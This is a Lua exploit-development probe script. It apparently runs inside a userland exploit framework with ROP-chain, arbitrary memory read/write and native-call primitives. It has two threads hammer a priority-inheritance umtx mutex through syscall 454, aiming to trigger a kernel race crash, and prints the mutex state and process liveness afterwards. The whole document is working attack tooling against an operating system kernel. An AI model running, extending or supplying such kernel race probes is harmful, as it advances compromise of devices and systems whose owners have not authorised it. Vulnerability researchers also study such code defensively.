-- CRASH_CLASS: HIGH
-- PROBE 648a: two threads hammer a PRIO_INHERIT umtx mutex
print("=== PROBE 648a: UMTX MUTEX RACE ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local ITER=20
local M=memory.alloc(8)
wq(N(M),uint64(4))
local W=memory.alloc(8)
wq(N(W),uint64(0))
local sc454=mk(454)
local function build()
    local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
    c:push_syscall_with_ret(mk(454), U(N(W)), uint64(2), uint64(0))
    for i=1,ITER do
        c:push_syscall_with_ret(mk(454), U(N(M)), uint64(5), uint64(0))
        c:push_syscall_with_ret(mk(454), U(N(M)), uint64(6), uint64(0))
    end
    return c
end
local ca=build()
local cb=build()
print("[A] chains built")
local ta=thread:new(ca)
local tb=thread:new(cb)
ta:run(true)
tb:run(true)
for i=1,400000 do local x=i end
wq(N(W),uint64(1))
local ow,rw=pcall(function() return sc454(U(N(W)),uint64(3),uint64(0x7fffffff)) end)
print(string.format("[B] wake rv=%s",tostring(ow and rw or "err")))
local oka=pcall(function() ta:join() end)
local okb=pcall(function() tb:join() end)
print(string.format("[C] joins a=%s b=%s",tostring(oka),tostring(okb)))
print(string.format("[D] M=%s alive=%d",tostring(rd(N(M))),N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
local o2,r2=pcall(function() return sc454(U(N(M)),uint64(5),uint64(0)) end)
print(string.format("[E] lock after race rv=%s M=%s",tostring(o2 and r2 or "err"),tostring(rd(N(M)))))
local o3,r3=pcall(function() return sc454(U(N(M)),uint64(6),uint64(0)) end)
print(string.format("[F] unlock rv=%s M=%s",tostring(o3 and r3 or "err"),tostring(rd(N(M)))))
print("[Z] alive")
